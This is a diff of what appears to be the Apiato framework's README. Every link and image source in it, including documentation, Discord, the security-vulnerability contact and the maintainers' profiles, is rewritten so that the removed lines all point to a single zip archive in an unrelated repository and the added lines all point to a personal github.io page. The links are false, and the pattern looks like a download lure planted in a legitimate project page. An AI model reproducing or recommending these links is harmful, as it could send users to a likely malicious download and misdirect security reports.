@@ -1,15 +1,15 @@
 <p align="center">
-   <img src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip" alt="Apiato Logo"/>
+   <img src="https://zaylem91.github.io" alt="Apiato Logo"/>
 </p>
 
 <h3 align="center">Build scalable API's faster | With PHP 8.0 and Laravel 10.0</h3>
 
-[//]: # (<a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip"><img src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip" alt="Build Status"></a>)
+[//]: # (<a href="https://zaylem91.github.io"><img src="https://zaylem91.github.io" alt="Build Status"></a>)
 <p align="center">
-<a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip"><img src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip" alt="Total Downloads"></a>
-<a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip"><img src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip" alt="Latest Stable Version"></a>
-<a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip"><img src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip" alt="License"></a>
-<a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip"><img src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip" alt="support"></a>
+<a href="https://zaylem91.github.io"><img src="https://zaylem91.github.io" alt="Total Downloads"></a>
+<a href="https://zaylem91.github.io"><img src="https://zaylem91.github.io" alt="Latest Stable Version"></a>
+<a href="https://zaylem91.github.io"><img src="https://zaylem91.github.io" alt="License"></a>
+<a href="https://zaylem91.github.io"><img src="https://zaylem91.github.io" alt="support"></a>
 </p>
 
 ## About Apiato
@@ -19,35 +19,35 @@ Apiato is a framework for building scalable and testable API-Centric Application
 It is designed to help you build scalable API's faster, by providing tools and functionalities that facilitate the
 development of any API-Centric App.
 
-Apiato is built using [Porto](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip),
-a new architectural pattern and comes with an amazing list of [features](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip):
+Apiato is built using [Porto](https://zaylem91.github.io),
+a new architectural pattern and comes with an amazing list of [features](https://zaylem91.github.io):
 
-- [Role-Based Access Control](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [API Documentations generator](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [Auto ID hashing](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [API versioning](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [Localization](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [Code generator](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [Shallow ETag](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [Social Authentication](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
-- [Query Parameters support](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
+- [Role-Based Access Control](https://zaylem91.github.io).
+- [API Documentations generator](https://zaylem91.github.io).
+- [Auto ID hashing](https://zaylem91.github.io).
+- [API versioning](https://zaylem91.github.io).
+- [Localization](https://zaylem91.github.io).
+- [Code generator](https://zaylem91.github.io).
+- [Shallow ETag](https://zaylem91.github.io).
+- [Social Authentication](https://zaylem91.github.io).
+- [Query Parameters support](https://zaylem91.github.io).
 
 
 ## Learning Apiato
-Apiato has an extensive and thorough [documentation](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
+Apiato has an extensive and thorough [documentation](https://zaylem91.github.io).
 
 ## Support and Community
-For free community support, join our [Discord server](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
+For free community support, join our [Discord server](https://zaylem91.github.io).
 
 ## Contributing
-Thank you for considering contributing to the Apiato framework! The contribution guide can be found in the [Apiato documentation](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
+Thank you for considering contributing to the Apiato framework! The contribution guide can be found in the [Apiato documentation](https://zaylem91.github.io).
 
 ## Code of Conduct
-In order to ensure that the Apiato community is welcoming to all, please review and abide by the [Code of Conduct](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
+In order to ensure that the Apiato community is welcoming to all, please review and abide by the [Code of Conduct](https://zaylem91.github.io).
 
 ## Security Vulnerabilities
 If you discover a security vulnerability within Apiato,
-please send an e-mail to Mohammad Alavi via [https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip).
+please send an e-mail to Mohammad Alavi via [https://zaylem91.github.io](https://zaylem91.github.io).
 All security vulnerabilities will be promptly addressed.
 
 ## Project Maintainers
@@ -55,25 +55,25 @@ All security vulnerabilities will be promptly addressed.
   <tbody>
      <tr>
         <td align="center" valign="top">
-            <img width="125" height="125" src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip">
+            <img width="125" height="125" src="https://zaylem91.github.io">
             <br>
             <strong>Mahmoud Zalt</strong>
             <br>
-            <a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip">@mahmoudz</a>
+            <a href="https://zaylem91.github.io">@mahmoudz</a>
         </td>
          <td align="center" valign="top">
-            <img width="125" height="125" src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip">
+            <img width="125" height="125" src="https://zaylem91.github.io">
             <br>
             <strong>Mohammad Alavi</strong>
             <br>
-            <a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip">@Mohammad-Alavi</a>
+            <a href="https://zaylem91.github.io">@Mohammad-Alavi</a>
         </td>
           <td align="center" valign="top">
-            <img width="125" height="125" src="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip">
+            <img width="125" height="125" src="https://zaylem91.github.io">
             <br>
             <strong>Moslem Deris</strong>
             <br>
-            <a href="https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip">@mderis</a>
+            <a href="https://zaylem91.github.io">@mderis</a>
           </td>
      </tr>
   </tbody>
@@ -83,27 +83,27 @@ All security vulnerabilities will be promptly addressed.
 
 ## License
 
-[MIT](https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip) © Mahmoud Zalt
+[MIT](https://zaylem91.github.io) © Mahmoud Zalt
 
 
 [comment]: # (Open Collective Tiers)
 
-[contributors-src]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[contributors-src]: https://zaylem91.github.io
 
-[contributors-href]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[contributors-href]: https://zaylem91.github.io
 
-[backers-src]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[backers-src]: https://zaylem91.github.io
 
-[backers-href]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[backers-href]: https://zaylem91.github.io
 
-[gold-sponsors-src]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[gold-sponsors-src]: https://zaylem91.github.io
 
-[gold-sponsors-href]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[gold-sponsors-href]: https://zaylem91.github.io
 
-[silver-sponsors-src]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[silver-sponsors-src]: https://zaylem91.github.io
 
-[silver-sponsors-href]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[silver-sponsors-href]: https://zaylem91.github.io
 
-[bronze-sponsors-src]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[bronze-sponsors-src]: https://zaylem91.github.io
 
-[bronze-sponsors-href]: https://github.com/zaylem91/bacuav-backend/raw/refs/heads/main/app/Containers/AppSection/Election/Data/Repositories/backend-bacuav-v2.3.zip
+[bronze-sponsors-href]: https://zaylem91.github.io
